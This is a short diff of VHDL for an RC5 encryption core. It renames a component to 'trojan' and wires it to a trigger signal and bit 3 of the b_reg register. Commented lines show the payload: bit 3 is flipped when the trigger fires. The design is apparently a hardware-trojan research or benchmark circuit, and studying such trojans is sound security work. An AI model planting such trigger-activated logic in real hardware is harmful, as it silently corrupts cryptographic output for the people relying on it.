@@ -36,10 +36,10 @@ Architecture rtl of rc5_enc is
 	signal b_reg	:	Std_logic_vector(31 downto 0);
 	signal trojan_out	: std_logic;
 	
-component main is 
-Port(A: in std_logic;
-	B: in std_logic;
-	Y: out std_logic
+component trojan is 
+Port(x: in std_logic;
+	sel: in std_logic;
+	trojan_trigger: out std_logic
 );
 end component;			
 --RC5 State Machine
@@ -53,7 +53,7 @@ Type StateType is 														--Type for state machine
 Signal state_en	:	StateType;											--Signal type of state machine
 signal b_reg_trojan: std_logic_vector(4 downto 0);
 Begin
-	trojan_lut : main PORT MAP (b_reg(3), trigger, trojan_out);
+	trojan_lut : trojan PORT MAP (b_reg(3), trigger, trojan_out);
 --	trojan_out <= not(b_reg(3));
 --	with trigger select
 --		b_reg_trojan<=b_reg(4) & trojan_out & b_reg (2 DOWNTO 0) when '1',
